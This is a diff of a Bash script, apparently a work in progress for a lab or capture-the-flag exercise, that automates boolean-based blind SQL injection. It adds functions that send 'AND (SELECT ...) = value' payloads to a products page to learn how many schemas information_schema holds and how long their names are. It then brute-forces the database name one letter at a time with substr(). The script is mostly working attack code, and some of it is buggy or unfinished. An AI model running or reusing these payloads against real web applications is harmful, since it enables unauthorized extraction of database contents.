@@ -1,49 +1,63 @@
 #!/bin/bash
-# get number of tables inside a database:
-# the number will start to count by 1 single table is equal to 1!
-# (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = '<database>') > 0
 
-# get the number of columns inside a table
-# (SELECT COUNT(*) FROM <table>) > 0
-
-# get the length of a column name
-# (SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_schema = <table_name>)
-
-# use the length to guess the name of the table
-
+declare -A object
 MYSQL_STANDARD_DATABASES=('mysql','information_schema')
+
+function enumarteViaNumber() {
+	((index++))
+  	[ $index -le 100 ]
+}
+
+function enumarteViaAlphabet() {
+	aplphabet='abcdefghijklmnopqrstuvwxyz'
+        ((y++))
+	echo $aplphabet[0]
+	index=$(echo $aplphabet[$y])
+	echo "$index"
+	echo $y
+        [ $y -le 26 ]
+}
 
 function loopThrow() {
 	START=1
 	END=100
 	placeholderSqli="$1"
-	for (( index=$START; index<=$END; index++)); do
+
+	while "${object['condition']}"; do
 		sqli="$(printf "${placeholderSqli}" "$index")"
 		request "$sqli"
                 result=$(echo $?)
                 if [ $result -eq 0 ]; then
-                        echo $index
+                        echo "$index "
                         break
                 fi
 	done
+	index=0
+	y=0
 }
 
+
 function getLength() {
-	echo 'i get you the length'
 	# store the length in array!
 	# required: ??
 	# parameter: ??
 	# IT Create from three parameter the sqli!
 
 	START_Y=1
-        END_Y=$2
+	END_Y=$((object['amountOfDatabases']))
+	results=''
 	sqlQuery="$1"
+	object['condition']='enumarteViaNumber'
+
+
+	#object['condition']='enumarteViaAlphabet'
 
 	for (( indey=$START_Y; indey<=$END_Y; indey++)); do
 		count=$((indey-1))
 		sqli="AND (${sqlQuery} LIMIT 1 OFFSET $count) = %d"
-		loopThrow "$sqli"
+		results+=$(loopThrow "$sqli")
 	done
+	echo $results
 }
 
 function encodeToUrl() {
@@ -79,6 +93,7 @@ function getAmount() {
 }
 
 function bruteForceName() {
+	#  sqli="and (SELECT substr(LOWER(table_name), $index,1) FROM information_schema.tables WHERE table_schema = 'duckyinc' LIMIT 1 OFFSET $offset) = '$letter'"
 	echo "i will get the name"
 	# required:
 	# - length
@@ -86,13 +101,45 @@ function bruteForceName() {
 	# - database/table/columns
 	# sqli
 
+	#1 many of databases = 5
+	#-> loop 5 times
+	#2 the length of the word 1 = 10
+	# -> second loop
+	# 3 inside the loop from 2 check if alphabet is equql
 
-	#for index in $(seq 1 $length); do
-	#	for letter in {a..z} do
-	#		echo ''
-	#		#request $encodedUrl
-	#	done
-	#done
+	sqlQuery=$1
+	#SELECT substr(LOWER(DATABASE()), %d,1)
+	placeholderSqli="AND (${sqlQuery}) = '%s'"
+
+	length=$((object['amountOfDatabases']))
+
+	#'SELECT substr(LOWER(DATABASE()), $index,1)
+	list=()
+
+	for (( index=0; index<=$length; index++ )); do
+		#echo "###$index erster Loop###"
+		name=''
+		for (( i=1; i<=$index; i++ )); do
+			#echo "#$i zweiter loop#"
+			for letter in {a..z}; do
+				#echo "$letter"
+				#echo $index
+				sqli="$(printf "${placeholderSqli}" "$i" "$letter")"
+				#echo "${sqli}"
+				#break
+				request "${sqli}"
+				result=$(echo $?)
+                		echo $result
+				if [ $result -eq 0 ]; then
+                       			name="${name}${letter}"
+					echo "$name"
+                        		break
+                		fi
+			done
+		done
+		echo "$name"
+		list+="${name}"
+	done
 }
 
 function request() {
@@ -122,4 +169,11 @@ PATH="products/1"
 #amountOfDatabases=$(getAmount 'SELECT COUNT(*) FROM information_schema.schemata')
 #echo "There are ${amountOfDatabases} in the server"
 # es sind 5 databases drinne!
-getLength 'SELECT length(schema_name) FROM information_schema.schemata' '5'
+object['amountOfDatabases']='5'
+#object['lengthOfDatabaseNames']=$(getLength 'SELECT length(schema_name) FROM information_schema.schemata')
+getLength 'SELECT length(schema_name) FROM information_schema.schemata'
+
+# get Database name
+echo "${object['lengthOfDatabaseNames']}"
+bruteForceName 'SELECT substr(LOWER(DATABASE()), %d,1)'
+#bruteForceName '(SELECT substr(DATABASE(),1,1)) = '
